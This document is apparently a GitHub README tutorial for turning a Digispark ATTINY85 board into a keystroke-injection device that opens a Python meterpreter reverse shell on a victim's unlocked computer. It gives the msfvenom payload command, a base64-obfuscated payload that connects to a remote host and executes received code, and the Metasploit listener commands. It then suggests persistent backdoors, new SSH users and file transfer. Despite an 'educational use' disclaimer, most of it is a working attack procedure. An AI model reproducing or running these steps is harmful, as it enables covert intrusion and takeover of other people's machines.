# Digispark ATTINY85 Python Reverse Shell
Developer: Anthony A. Castor

This Source does not give any warranty please use at your own risk </br>
This is only for educational use.. use this tutorial at your own risk.</br>
Great power comes with great responsibility</br>

Digispark ATTINY85 Python Reverse Shell </br>

This application is free of virus or malware </br>

<h3>Software Requirment </h3>
Andruino Editor<br/>
Digispark<br/>
Kali Linux<br/>
Python 2.x<br/>

<h3>Online Application</h3>
Distribution itch(Web and Desktop): https://goo.gl/Wq1nuD </br>
Distribution Google Play: https://goo.gl/uKIIr4 </br>
Distribution Itunes AppStore: https://goo.gl/54yJPi </br>
Distribution Amazon Store: https://goo.gl/RUp1Od </br>
Distribution Windows Store: https://goo.gl/rCxsH6   (No Direct link to Dev Page) </br>
Distribution WearVR: https://goo.gl/y0X1nR  (No Direct link to Dev Page) </br>

<h3>More Information and Demo Videos </h3>
Facebook: https://goo.gl/vvDSIL </br>
Linkedin: https://goo.gl/c9Fh6n </br>
YouTube: https://goo.gl/BFZ7C5 </br>
StackOverFlow: https://goo.gl/J1hFqL </br>
Github: https://goo.gl/jPHFPe </br>


<h3>Metasploit: Creting the Payload</h3>
This part will be done in Kali Linux</br>
We have to create a code which when executed in the victims machine initiates a reverse tcp connection. In the Terminal, execute the below command.</br>

msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP ADDRESS OF YOUR MACHINE exp(192.168.1.1)> LPORT=<PORT FOR REVERSE SHELL TO CONNECT ON exp(9999)> R > pythonpayload.py</br>


This will create a payload named pythonpaload.py.</br>
The contents of the file looks somewhat like this</br>

import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxMC45LjcuMjA3Jyw5MDAwKSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==')))</br>

Now open that file and copy all the contents in the file to the "DigiKeyboard.println("Paste the python code here");"</br>

<h3>Setting Up the Listener</h3>
Next we have to start the listener which will wait for incoming connections in the given port. Fire up metasploit and execute the below codes in order.</br>


msfconsole</br>
use multi/handler</br>
set PAYLOAD python/meterpreter/reverse_tcp</br>
set LHOST <IP ADDRESS OF YOUR MACHINE exp(192.168.1.1)> </br>
set LPORT <PORT FOR REVERSE SHELL TO CONNECT ON exp(9999)> </br>
exploit </br>

This will start the listener.</br>

<h3>Launch the Attack </h3>
Now all you have to do is connect this digispark to our Victims unlocked machine. </br>
All you need is a 10 second window. All the codes will run in 5 seconds. </br>

Once you get the shell, you can do almost anything with that; create a persistent back door, upload or download files, create another user and provide it SSH access, possibilities are endless. </br>


<h3>Note</h3>
This is only for educational use.. use this tutorial at your own risk.</br>
Great power comes with great responsibility</br>